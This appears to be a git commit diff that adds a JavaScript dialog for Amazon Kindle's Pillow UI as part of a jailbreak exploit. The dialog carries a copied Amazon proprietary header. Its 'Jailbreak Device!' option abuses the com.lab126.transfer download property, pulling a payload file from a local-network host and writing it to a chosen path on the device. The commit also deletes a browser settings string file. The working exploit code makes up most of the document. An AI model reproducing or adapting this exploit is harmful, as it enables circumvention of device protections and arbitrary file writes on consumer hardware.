973b9671d9346b6c8c0b059d58aa48c414ba2809
Bluebotlabz <69104218+Bluebotlabz@users.noreply.github.com>
2023-11-01 18:14:09 +0000

    Refactoring + Add alternate path support

---
+++ js/mountsus_dialog.js
@@ -0,0 +1,129 @@
+/*
+ * browser_setting_dialog.js
+ *
+ * Copyright (c) 2023 Amazon.com, Inc. or its affiliates. All Rights Reserved.
+ *
+ * PROPRIETARY/CONFIDENTIAL
+ *
+ * Use is subject to license terms.
+ */
+
+Pillow.MountSusDialog = function () {
+    var that = this;
+    var parent = Pillow.extend(this, new Pillow.Case('MountSusDialog'));
+    var windowTitle = null;
+    var listWidget = null;
+    var selectedItem = null;
+    var settingList = null;
+    var jsEnabled = true;
+    var imageEnabled = true;
+    var file = ""; // The file to edit and send to the server
+    var filePath = ""; // The location to download the file to
+    var lipcId = null;
+    const SETTINGS_DIALOG_ID = "dialog";
+
+
+    /**
+     * Sets up the dialog with Pillow and prepares the interface.
+     */
+    this.onLoad = function () {
+        nativeBridge.registerClientParamsCallback(this.clientParamsCallback);
+        Pillow.setOption(OPTION_SEND_DELETE_EVENTS, true);
+        windowTitle = new WindowTitle(WINMGR.LAYER.DIALOG, WINMGR.ROLE.DIALOG);
+        windowTitle.withChanges(function () {
+            this.addParam(WINMGR.KEY.WIN_IS_MODAL,
+                WINMGR.MODALITY.DISMISSIBLE_MODAL);
+        });
+        listWidget = new ListWidget('settings', {
+            fields: ['name','id'],
+            handler: listItemSelection,
+            xor: true
+        });
+        cancelButton = document.getElementById('advancedCancelButton');
+        new XorButton(cancelButton, Pillow.bind(this, 'close', null),
+                      cancelButton, 'dialog-close','dialog-close xor');
+        var dialogElem = document.getElementById(SETTINGS_DIALOG_ID);
+        nativeBridge.setWindowSize(dialogElem.offsetWidth, 700);
+        this.show();
+        parent(this).onLoad();
+        modifyClassNameDOM();
+    };
+
+    var listItemSelection = function (item) {
+
+        Pillow.logInfo("MountSus.listItemSelection selectedItem=" + item.name + " " + item.id);
+
+        document.getElementById("jailState").innerText = "Sending property...";
+        var constructedDownloadRequest = {
+            url:                        "http://192.168.1.142/mntus.params",        // The path to the server
+            dest:                       filePath,           // Destination
+            unique_id:                  "archivedItems",
+            transport_any:              1,
+            priority:                   80,
+            notify_progress_interval:   20,
+            notify_pub:                 "com.lab126.archive",
+            notify_prop:                "transferProgressNotification",
+            extra_headers:              "fileData:" + encodeURIComponent(file)  // Server will merely return the contents of this header (encoded because newlines will cause issues)
+        }
+        
+        nativeBridge.accessHasharrayProperty("com.lab126.transfer", "request_download", constructedDownloadRequest);
+
+        document.getElementById("jailState").innerText = "Property sent...";
+
+        setTimeout(function () {
+            document.getElementById("jailState").innerText = "Done!";
+        }, 1000);
+    };
+
+    this.clientParamsCallback = function (clientParamsString){
+        // parse clientParams
+        var clientParams = JSON.parse(clientParamsString);
+        file = clientParams.fileData; // Add the payload
+        filePath = clientParams.filePath;
+        jsEnabled =  (clientParams.jsEnabled === 'true');
+        imageEnabled =  (clientParams.imageEnabled === 'true');
+        lipcId = clientParams.replySrc;
+
+        document.getElementById("jailState").innerText = "You are currently in jail.";
+    };
+
+    this.getBrowserSettings = function () {
+        var displayList = [];
+        displayList.push({
+            name: "Jailbreak Device!",
+            id: "jailbreak_device"
+        });
+
+        return displayList;
+    };
+
+    this.renderBrowserSettings = function(settingList, widgetOptions) {
+        listWidget.setItems(settingList, widgetOptions);
+    };
+
+    this.setBrowserSettings = function (widgetOptions) {
+        settingList = this.getBrowserSettings();
+        this.renderBrowserSettings(settingList, widgetOptions);
+    };
+
+    this.show = function () {
+        this.setBrowserSettings(true);
+        nativeBridge.showMe();
+    };
+
+    this.hide = function () {
+        Pillow.logInfo("MountSusDialog.hide called");
+        windowTitle.addParam(WINMGR.KEY.HIDE_DIALOG, WINMGR.DIALOG_HIDE.BACKGROUND);
+    };
+
+    this.close = function () {
+        Pillow.logInfo("MountSusDialog.close called");
+        nativeBridge.dismissMe();
+    };
+
+    Pillow.logWrapObject('Pillow.MountSusDialog', this);
+};
+
+var mountSusDialog = new Pillow.MountSusDialog();
+mountSusDialog.register();
+
--- strings/browser_settings_dialog_strings.js
+++
@@ -1,9 +0,0 @@
-var BrowserSettingsStringTable = {
-    browserSettings: 'Browser Settings',
-    clearCookies: 'Clear Cookies',
-    clearHistory: 'Clear History',
-    disableJavaScript: 'Disable Javascript',
-    enableJavaScript: 'Enable Javascript',
-    disableImages: 'Disable Images',
-    enableImages: 'Enable Images'
-};
